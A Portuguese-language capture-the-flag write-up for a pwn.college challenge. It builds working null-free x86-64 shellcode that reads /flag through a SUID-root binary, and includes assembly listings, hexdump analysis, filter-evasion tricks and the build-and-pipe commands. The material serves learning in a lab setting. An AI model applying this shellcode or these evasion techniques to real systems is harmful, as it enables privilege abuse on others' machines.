# Writeup: pwn.college — Binary Exploitation: Null-Free Shellcode

## Descrição do Desafio

Similar aos desafios anteriores, o binário lê bytes do stdin, copia para uma região de memória e os executa como código. A diferença crítica desta vez é que o programa **filtra qualquer null byte (`0x00`) do shellcode antes de executar** — ao encontrar um null byte, encerra a execução imediatamente:

```
This challenge requires that your shellcode have no NULL bytes!
Failed filter at byte 4!
```

O objetivo continua sendo ler `/flag`:

```
-r-------- 1 root root 58 /flag
```

O binário tem SUID (dono root), então o shellcode roda com EUID=0:

```
-rwsr-xr-x 1 root root /challenge/binary-exploitation-null-free-shellcode
```

---

## Abordagem 1: Shell interativo com `execve` (descartada)

A primeira tentativa foi um shellcode clássico que invoca `/bin/sh`. Descartada pelo mesmo motivo do desafio básico: o `/bin/sh` dropa o EUID ao iniciar (faz `setuid(UID)`), perdendo o privilégio de root necessário para ler `/flag`. A solução correta é fazer as syscalls diretamente — `open`, `read`, `write`, `exit` — sem criar um novo processo, preservando o EUID=0 durante toda a execução.

---

## Abordagem 2: Shellcode open/read/write como ponto de partida (shellcode1)

O shellcode base, sem preocupação com null bytes, ficou assim:

```asm
.global _start
_start:
.intel_syntax noprefix

    # open("/flag", O_RDONLY) → retorna fd em rax
    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    mov rdx, 0
    syscall

    # salva o fd em rdi para o read
    mov rdi, rax

    # read(fd, buf, 0x100) → lê o conteúdo do arquivo
    mov rax, 0
    lea rsi, [rip + results]
    mov rdx, 0x100
    syscall

    # write(stdout, buf, 0x100) → imprime na tela
    mov rax, 1
    mov rdi, 1
    lea rsi, [rip + results]
    mov rdx, 0x100
    syscall

    # exit(0)
    mov rax, 60
    mov rdi, 0
    syscall

flag:
    .string "/flag"
results:
    .space 100
```

Ao compilar, extrair o `.text` e enviar como input:

```bash
gcc -nostdlib -static -o shellcode1-elf shellcode1.s
objcopy --dump-section .text=shellcode1-raw shellcode1-elf
cat shellcode1-raw | /challenge/binary-exploitation-null-free-shellcode
```

O filtro encerrou no byte 4:

```
Failed filter at byte 4!
```

---

## Identificando os Null Bytes

### Ferramenta: `hd` (hexdump)

```bash
hd shellcode1-raw
```

O hexdump revelou dois padrões de null bytes se repetindo ao longo do shellcode:

**Padrão 1 — `mov reg, imm` com imediato pequeno:**

```
48 c7 c0 02 00 00 00   →   mov rax, 0x2
48 c7 c6 00 00 00 00   →   mov rsi, 0x0
48 c7 c2 00 00 00 00   →   mov rdx, 0x0
48 c7 c2 00 01 00 00   →   mov rdx, 0x100
```

A instrução `mov reg, imm64` espera 4 bytes para o campo do imediato. Como `0x2` ocupa apenas 1 byte, o assembler preenche os 3 bytes restantes com `00 00 00`. O mesmo acontece com qualquer imediato pequeno.

**Padrão 2 — `lea reg, [rip + offset]` com offset pequeno:**

```
48 8d 3d 58 00 00 00   →   lea rdi, [rip + 0x58]
48 8d 35 3d 00 00 00   →   lea rsi, [rip + 0x3d]
```

O campo de offset do `lea` também espera 4 bytes. Com `flag` e `results` posicionados *após* o `_start`, os offsets são pequenos e positivos — os bytes altos ficam zerados.

### Confirmando com `objdump`

```bash
objdump -M intel -d shellcode1-elf
```

O objdump confirmou as instruções com null bytes, mostrando os offsets exatos do `lea` e os imediatos do `mov` — todos com `00 00 00` nos bytes altos.

---

## Eliminando os Null Bytes (shellcode2)

### Caso 1: `mov reg, imm` → substituição por `xor` + `add`

Para `mov reg, 0`, basta usar `xor reg, reg`:

```asm
xor rsi, rsi    # substitui mov rsi, 0  →  48 31 f6  (sem null bytes)
xor rdx, rdx    # substitui mov rdx, 0  →  48 31 d2  (sem null bytes)
```

Para `mov reg, imm` com imediato não-nulo pequeno, substitui por `xor reg, reg` + `add reg, imm`:

```asm
# antes (com null bytes):
mov rax, 2          # 48 c7 c0 02 00 00 00

# depois (sem null bytes):
xor rax, rax        # 48 31 c0
add rax, 2          # 48 83 c0 02
```

O `add` com imediato de 8 bits (`48 83`) usa apenas 1 byte para o valor — sem extensão com zeros.

**Caso especial — `mov rdx, 0x100`:**

Trocar por `xor rdx, rdx` + `add rdx, 0x100` não resolve — o próprio `0x100` gera null bytes:

```
48 81 c2 00 01 00 00   →   add rdx, 0x100   ← ainda tem null bytes!
```

A solução foi usar o registrador `dh`, que é o **segundo byte menos significativo** de `rdx`. Colocar `1` em `dh` equivale a colocar `0x100` em `rdx`:

```asm
xor rdx, rdx
mov dh, 0x1     # rdx = 0x0000000000000100
                # opcode: b6 01  →  apenas 2 bytes, sem null bytes!
```

### Caso 2: offsets pequenos no `lea` → mover dados para antes do `_start`

Com `flag` e `results` posicionados *após* o código, o `rip` precisa *avançar* para alcançá-los — offsets positivos pequenos, com bytes altos zerados.

A solução foi mover `flag` e `results` para *antes* do `_start`. Assim o `rip` precisa *recuar* para alcançá-los — os offsets ficam negativos. Em complemento de 2, um número negativo tem todos os bytes altos em `0xff`:

```
# antes (offset positivo pequeno → null bytes):
48 8d 35 3d 00 00 00   →   lea rsi, [rip + 0x3d]

# depois (offset negativo → sem null bytes):
48 8d 35 dd fe ff ff   →   lea rsi, [rip - 0x123]
```

O shellcode2 reorganizado:

```asm
.global _start

flag:
    .string "/flag"
results:
    .fill 0x200, 1, 0x90

_start:
.intel_syntax noprefix

    xor rax, rax
    add rax, 2
    lea rdi, [rip + flag]
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax
    xor rax, rax
    lea rsi, [rip + results]
    xor rdx, rdx
    mov dh, 0x1
    syscall

    mov rdx, rax
    xor rax, rax
    inc rax
    xor rdi, rdi
    inc rdi
    lea rsi, [rip + results]
    syscall

    xor rax, rax
    add rax, 60
    xor rdi, rdi
    syscall
```

Verificando com `objdump -M intel -d shellcode2-elf`, nenhuma instrução mostrava null bytes nas instruções. Parecia resolvido. Mas ao rodar:

```
Failed filter at byte 5!
```

---

## Null Bytes Ocultos: o que o `objdump` não mostra

O `objdump` desassembla apenas **instruções** — ele não mostra o conteúdo de dados estáticos como `.string` e `.space`. Para ver os bytes brutos reais:

```bash
hd shellcode2-raw
```

O hexdump revelou zeros logo após `/flag`:

```
00000000  2f 66 6c 61 67 00 00 00  00 00 00 00 00 00 00 00  |/flag...........|
```

Dois problemas ocultos:

### Problema 1: `.string "/flag"` adiciona `\0` automaticamente

Em assembly (e em C), `.string` é equivalente a uma string terminada em null. O byte `\0` é inserido automaticamente ao final — ele não aparece no `objdump` porque está na seção de dados, não de instruções, mas está presente nos bytes brutos e é filtrado pelo desafio.

### Problema 2: `.space N` preenche com zeros

A diretiva `.space N` reserva N bytes inicializados com `0x00`. Todo esse bloco de zeros é null byte e mata o shellcode antes mesmo de chegar nas instruções.

**Solução para o `.space`:** trocar por `.fill N, 1, 0x90`, que preenche com `0x90` (NOP) em vez de zeros — sem null bytes. O tamanho foi aumentado para `0x200` para garantir que o `read` de `0xff` bytes não sobrescreva as instruções do `_start`.

---

## O Problema do Terminador de String

A primeira tentativa para resolver o `.string` foi trocar por `.ascii "/flag"` — que não adiciona o `\0` automático. Mas isso causou segfault: sem o terminador, o `open()` continua lendo a memória além de `/flag` até encontrar um zero em algum lugar imprevisível.

O `open()` **precisa** do `\0` para saber onde a string termina. O desafio é: como colocar um `\0` após `/flag` sem que ele apareça no shellcode compilado?

### Solução: construção da string na stack em runtime

A chave está em entender **quando** o filtro age:

```
Filtro checa:   bytes do shellcode-raw (em tempo de load, antes de executar)
Null bytes OK:  dados criados em runtime (push, operações na stack durante execução)
```

Em vez de ter `/flag\0` como dado estático no shellcode, a string é construída na stack durante a execução — os null bytes existem apenas em runtime, nunca no shellcode compilado.

**Passo 1:** Empurrar 8 bytes nulos na stack como terminador:

```asm
xor rsi, rsi
push rsi        # empurra 0x0000000000000000 na stack → terminador \0 em runtime
```

**Passo 2:** Empurrar `/flag` na stack. O `push` em 64 bits sempre empurra 8 bytes. Como `/flag` tem apenas 5 bytes (`0x67616c662f`), os 3 bytes restantes precisam ser não-nulos. A solução foi usar `0x90` como padding:

```asm
movabs rbx, 0x67616c662f909090   # "/flag" + 0x909090 de padding
                                  # 8 bytes completos → sem null bytes no opcode!
push rbx
```

O `movabs` carrega um imediato de exatamente 64 bits. Como `0x67616c662f909090` ocupa todos os 8 bytes, não há zeros de preenchimento no opcode.

**Passo 3:** Apontar `rdi` para o início de `/flag`, pulando os 3 bytes de padding:

```asm
lea rdi, [rsp + 3]    # pula os 3 bytes 0x90, aponta para '/'
```

O layout na stack após os dois `push`, em memória (little-endian, endereços crescem para cima):

```
endereço maior
  rsp+8 → 00 00 00 00 00 00 00 00   ← push rsi (8 bytes de \0 — terminador)
  rsp+3 → 2f 66 6c 61 67            ← "/flag"
  rsp   → 90 90 90                  ← padding 0x90
endereço menor

rdi = rsp + 3  →  aponta para '/'
open() lê:  '/' 'f' 'l' 'a' 'g' '\0'  →  "/flag\0"  ✅
```

O `open()` lê a partir de `rdi`, encontra `/flag` e para no `\0` que veio do `push rsi`. Tudo construído em runtime — nenhum null byte no shellcode compilado.

---

## Padding Final

O binário lê exatamente `0x1000` bytes do stdin. O shellcode compilado tem muito menos — os bytes restantes seriam lidos como zeros, que o filtro detectaria.

A solução foi usar o `.fill` no final do assembly para preencher automaticamente até `0x1000` bytes:

```asm
.fill 0x1000 - (. - buffer), 1, 0x90
```

O `.` representa o endereço atual (após a última instrução). `(. - buffer)` calcula quantos bytes o shellcode ocupa desde o início de `buffer`. Subtraindo de `0x1000`, obtém quantos bytes faltam — e todos são preenchidos com `0x90`.

---

## Shellcode Final (shellcode3)

```asm
.global _start
.intel_syntax noprefix

buffer:
    .fill 0x200, 1, 0x90            # buffer para o read, sem null bytes

_start:
    # open("/flag", O_RDONLY)
    xor rax, rax
    add rax, 2
    xor rsi, rsi
    push rsi                          # terminador \0 na stack (runtime)
    movabs rbx, 0x67616c662f909090   # "/flag" + padding 0x90 (8 bytes completos)
    push rbx
    lea rdi, [rsp + 3]               # pula o padding, aponta para '/'
    xor rsi, rsi
    xor rdx, rdx
    syscall

    # read(fd, buffer, 0x100)
    mov rdi, rax
    xor rax, rax
    xor rsi, rsi
    lea rsi, [rip + buffer]
    xor rdx, rdx
    mov dh, 0x1                      # rdx = 0x100 sem null bytes
    syscall

    # write(stdout, buffer, bytes_lidos)
    mov rdx, rax
    xor rax, rax
    inc rax
    xor rdi, rdi
    inc rdi
    lea rsi, [rip + buffer]
    syscall

    # exit(0)
    xor rax, rax
    add rax, 60
    xor rdi, rdi
    syscall

    .fill 0x1000 - (. - buffer), 1, 0x90
```

### Compilação e execução

```bash
gcc -nostdlib -static shellcode3.s -o shellcode3-elf
objcopy --dump-section .text=shellcode3-raw shellcode3-elf
python3 -c "
import sys
with open('shellcode3-raw', 'rb') as f:
    sc = f.read()
padding = b'\x90' * (0x1000 - len(sc))
sys.stdout.buffer.write(sc + padding)
" | /challenge/binary-exploitation-null-free-shellcode
```

O script Python garante que exatamente `0x1000` bytes sejam enviados ao binário, todos não-nulos — complementando o `.fill` do assembly para cobrir qualquer byte restante.

---

## Resultado

```
pwn.college{Qc9ZoaHOQGM-jJgprLWp63G1P-E.dlTMywCOzYTNxEzW}
```

---

## Resumo das Técnicas e Soluções

| Problema | Causa | Solução |
|---|---|---|
| `mov rax, 2` gera `00 00 00` | Imediato pequeno, assembler preenche bytes altos com zeros | `xor rax, rax` + `add rax, 2` |
| `mov rdx, 0x100` gera null | `0x100` tem zero no byte mais baixo | `xor rdx, rdx` + `mov dh, 0x1` |
| `lea` com offset pequeno positivo | Dados após `_start` → offset positivo pequeno → bytes altos zerados | Mover dados antes do `_start` → offset negativo → bytes altos `0xff` |
| `.string "/flag"` adiciona `\0` | Terminador automático de string C — presente nos bytes brutos, invisível no `objdump` | Construir string na stack em runtime com `push` |
| `.space N` preenche com zeros | Inicialização padrão é `0x00` | Usar `.fill N, 1, 0x90` |
| Bytes finais do input são zeros | Binário lê `0x1000` bytes, resto do input é `\0` | `.fill 0x1000 - (. - buffer), 1, 0x90` + padding Python |

**Técnicas:** Null-free shellcode · Direct syscall shellcode · Position-independent shellcode · SUID privilege abuse · Stack string construction em runtime
